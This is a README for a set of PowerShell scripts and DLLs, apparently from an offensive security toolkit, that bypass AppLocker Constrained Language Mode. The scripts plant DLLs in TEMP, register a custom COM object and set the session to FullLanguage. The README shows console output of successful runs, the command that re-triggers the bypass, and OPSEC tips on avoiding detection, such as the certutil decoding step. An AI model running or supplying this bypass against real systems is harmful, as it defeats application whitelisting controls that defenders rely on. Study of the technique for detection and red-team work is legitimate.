

### `Bypass-ConstrainedLanguageMode`

Tries to bypass AppLocker Constrained Language Mode via custom COM object (as documented by @xpn in: https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/ )
This directory contains three DLLs, namely: 
- `ClmDisableDll86.dll`, 
- `ClmDisableDll64.dll`, 
- `ClmDisableAssembly.dll`. 

They are going to be copied into `%TEMP%` directory. Then one of Powershell scripts choosen will create a COM object pointing to `ClmDisableDllYY.dll` library (depending on platform architecture detected). 
This effectively COM will instantiate an `InProcServer32` dll that is a native _.NET4 CLR host_ responsible for loading provided assembly in current AppDomain. The assembly will finally put a `FullLanguage` value into `LanguageMode` property of session data context. This should disable CLM for current Runspace.

Three scripts constitute this bypass, whereas the use of only one is sufficient:
  - `Bypass-CLM.ps1` - the original one, that is inteded to be put side by side with three acompanying files. It does not include any of that DLL files, merely copies them to TEMP, creates a COM object and instantiates a new instance of that COM.
  - `Bypass-CLM2.ps1` - the same as above but with the difference that it embeds all of the three DLL files in form of a Base64 encoded blob. This blob will be then written to TEMP in form of text file, which will get decoded using `certutil -decode` (**OPSEC Warning!**)
  - `Bypass-CLM-Mini.ps1` - the same as above (`Bypass-CLM2.ps1`) but with the difference that the entire script was itself Base64 encoded. It will be decoded using `certutil -decode` (**OPSEC Warning!**) and then proceeds with it's logic.

Successful launch of these script looks as follows:

```
PS >  $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage 
PS > .\Bypass-CLM.ps1
        AppLocker Constrined Language Mode Bypass via COM
        (implementation of: @xpn's technique, as documented in:)
        (https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/)

        Re-implemented, enhanced by: Mariusz Banach, mgeeky
        -----

[.] Step 0. Planted DLL files in:
        C:\Users\danj\AppData\Local\Temp\ClmDisableAssembly.dll
        C:\Users\danj\AppData\Local\Temp\ClmDisableDll.dll
[.] Step 1. Creating custom COM object.
[.] Step 2. Invoking it (ClmDisableDll)...
        Powershell runspace Thread ID: 8716
[+] Managed mode assembly. Disabling CLM globally.
        Current thread ID (managed/unmanaged): 8 / 8716
        Passed argument: '(called from native CLR host)'

============
Use below command to disable CLM on Demand (ignore errors):

        PS> New-Object -ComObject ClmDisableDll

============

[+] Finished. CLM status: FullLanguage

PS > New-Object -ComObject ClmDisableDll
PS > $ExecutionContext.SessionState.LanguageMode
FullLanguage 
```

And for the mini version of that script:

```
PS > .\Bypass-CLM-Mini.ps1
Input Length = 308574
Output Length = 115712
CertUtil: -decode command completed successfully.
[+] Managed mode assembly. Disabling CLM globally.
        Current thread ID (managed/unmanaged): 8 / 8716
        Passed argument: '(called from native CLR host)'

[+] Finished. CLM status: FullLanguage
```

Since this script only alters static variable determining CLM mode from within a separated Runspace dedicated to loaded Assembly, we need to instantiate our own COM object within working Powershell environment like so:

```
PS> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

PS> New-Object -ComObject ClmDisableDll

PS> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

Any further commands will be executed in CLM disabled runspace. 

Things to consider for **OPSEC**:
- This script comes with three additional DLL files: `ClmDisable86.dll`, `ClmDisable64.dll`, `ClmDisableAssembly.dll`. They're going to be inserted into `%TEMP%`. 
- Scipts `Bypass-CLM2.ps1` and `Bypass-CLM-Mini.ps1` create text files within `%TEMP%` and use `certutil -decode` to base64 decode them.
- This bypass works only for the current Runspace, therefore it is required to put your commands at the end of these `Bypass-*.ps1` scripts or to instantiate a New-Object within working PowerShell environment to leverage the bypass.

